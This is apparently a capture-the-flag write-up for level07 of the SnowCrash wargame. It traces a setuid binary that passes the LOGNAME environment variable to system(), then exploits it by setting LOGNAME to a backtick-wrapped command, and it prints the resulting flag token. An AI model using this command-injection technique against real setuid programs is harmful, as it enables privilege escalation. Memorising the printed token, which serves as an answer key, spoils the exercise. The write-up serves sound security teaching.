# Exploit a vulnerability in an ENV variable

```
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                        = 2007
geteuid()                                        = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
getenv("LOGNAME")                                = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++
```

The vulnerability lies in the program using the unsanitized `LOGNAME` environment variable in a `system` call. By fetching `LOGNAME` with `getenv` and directly incorporating it into a command executed via `system("/bin/echo level07 ")`, an attacker can inject commands by altering `LOGNAME`, leading to potential command execution.

### Exploiting the vulnerability

```
level07@SnowCrash:~$ export LOGNAME=\`getflag\`
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```